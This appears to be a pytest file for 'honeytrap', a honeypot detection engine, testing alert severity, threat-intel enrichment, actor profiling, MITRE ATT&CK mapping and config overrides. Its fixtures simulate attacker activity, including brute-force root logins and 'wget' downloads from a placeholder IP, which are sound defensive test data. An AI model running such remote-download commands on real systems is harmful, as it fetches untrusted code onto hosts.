import pytest

from honeytrap.config import load_config
from honeytrap.detection.commands import BEHAVIOURS
from honeytrap.detection.engine import actor_type, apply_enrichment, build_profiles, evaluate, risk_level, should_notify
from honeytrap.detection.rules import rule_catalog
from honeytrap.mitre.catalog import attack_version, get_technique, load_catalog, map_technique
from honeytrap.models import Severity

# ----------------------------------------------------------------- severity


def test_severity_parse_and_escalate():
    assert Severity.parse("high") is Severity.HIGH
    assert Severity.parse(2) is Severity.MEDIUM
    assert Severity.LOW.escalate() is Severity.MEDIUM
    assert Severity.CRITICAL.escalate(3) is Severity.CRITICAL
    assert Severity.INFORMATIONAL.label == "Informational"


def _bruteforce(log, ip="8.8.8.8"):
    for i in range(10):
        log.login("root", f"p{i}", ip=ip)
    return log.events()


def test_real_abuseipdb_signal_escalates(log):
    events = _bruteforce(log)
    alerts = evaluate(events)
    enrichment = {"8.8.8.8": {"status": "ok", "sources": {"abuseipdb": {"status": "ok", "abuse_confidence_score": 90}}}}
    apply_enrichment(alerts, enrichment)
    bf = next(a for a in alerts if a.rule_id == "HT-AUTH-001")
    assert bf.severity == "High"
    assert any("AbuseIPDB confidence 90" in r for r in bf.severity_reasons)
    apply_enrichment(alerts, enrichment)  # idempotent
    assert bf.severity == "High"


def test_virustotal_signal_escalates(log):
    alerts = evaluate(_bruteforce(log))
    apply_enrichment(alerts, {"8.8.8.8": {"status": "ok", "sources": {"virustotal": {"status": "ok", "malicious": 7}}}})
    assert next(a for a in alerts if a.rule_id == "HT-AUTH-001").severity == "High"


def test_synthetic_enrichment_never_escalates(log):
    alerts = evaluate(_bruteforce(log))
    apply_enrichment(alerts, {"8.8.8.8": {"status": "synthetic", "sources": {
        "abuseipdb": {"status": "synthetic", "abuse_confidence_score": 100}}}})
    assert next(a for a in alerts if a.rule_id == "HT-AUTH-001").severity == "Medium"


def test_low_reputation_does_not_escalate(log):
    alerts = evaluate(_bruteforce(log))
    apply_enrichment(alerts, {"8.8.8.8": {"status": "ok", "sources": {
        "abuseipdb": {"status": "ok", "abuse_confidence_score": 10}}}})
    assert next(a for a in alerts if a.rule_id == "HT-AUTH-001").severity == "Medium"


def test_notification_threshold(log):
    log.cmd("wget http://198.51.100.2/x")
    log.cmd("uname -a")
    alerts = {a.rule_id: a for a in evaluate(log.events())}
    assert should_notify(alerts["HT-DL-001"])
    assert not should_notify(alerts["HT-CMD-001"])


@pytest.mark.parametrize("score,level", [(0, "Informational"), (10, "Low"), (30, "Medium"), (55, "High"),
                                         (80, "Critical")])
def test_risk_levels(score, level):
    assert risk_level(score) == level


def test_actor_types():
    base = {"commands": 0, "login_attempts": 0}
    assert actor_type(base, set()) == "Scanner / probe"
    assert actor_type({**base, "login_attempts": 4}, {"brute-force"}) == "Credential brute-forcer"
    assert actor_type({**base, "commands": 2}, set()) == "Automated post-login script"
    assert actor_type({**base, "commands": 2}, {"persistence"}) == "Interactive intruder"
    assert actor_type({**base, "commands": 2}, {"download"}) == "Malware dropper / bot loader"


def test_profiles(log):
    log.login("root", "toor", ok=True)
    log.cmd("wget http://198.51.100.2/x")
    events = log.events()
    profiles = build_profiles(events, evaluate(events))
    (p,) = profiles
    assert p["actor_type"] == "Malware dropper / bot loader"
    assert p["successful_logins"] == 1 and p["commands"] == 1
    assert 0 < p["risk_score"] <= 100


# ----------------------------------------------------------------- MITRE


def test_catalog_is_attack_v20_and_complete():
    catalog = load_catalog()
    assert attack_version() == "20.0"
    used = {b.technique_id for b in BEHAVIOURS} | {t for r in rule_catalog() for t in r["techniques"]}
    assert used <= set(catalog["techniques"]), used - set(catalog["techniques"])


def test_revoked_techniques_are_not_used():
    # T1562.004 was revoked in ATT&CK v20 (replaced by T1686); T1562.003 by T1690.
    used = {b.technique_id for b in BEHAVIOURS}
    assert not {"T1562.004", "T1562.003", "T1562.001"} & used
    with pytest.raises(KeyError):
        get_technique("T1562.004")


def test_mapping_requires_evidence_and_valid_confidence():
    with pytest.raises(ValueError):
        map_technique("T1110", confidence="high", evidence=[])
    with pytest.raises(ValueError):
        map_technique("T1110", confidence="certain", evidence=["x"])
    m = map_technique("T1105", confidence="high", evidence=["$ wget http://x"])
    assert m.name == "Ingress Tool Transfer" and m.tactics == ["Command and Control"]
    assert m.url.startswith("https://attack.mitre.org/techniques/T1105")


# ----------------------------------------------------------------- config


def test_config_override_merges(tmp_path):
    override = tmp_path / "o.toml"
    override.write_text("[brute_force]\nfailed_logins = 3\n")
    cfg = load_config(override)
    assert cfg["brute_force"]["failed_logins"] == 3
    assert cfg["brute_force"]["window_minutes"] == 10
    assert cfg["severity"]["notify_min_severity"] == "High"


def test_config_env_var(tmp_path, monkeypatch):
    override = tmp_path / "o.toml"
    override.write_text('[severity]\nnotify_min_severity = "Medium"\n')
    monkeypatch.setenv("HONEYTRAP_DETECTION_CONFIG", str(override))
    assert load_config()["severity"]["notify_min_severity"] == "Medium"
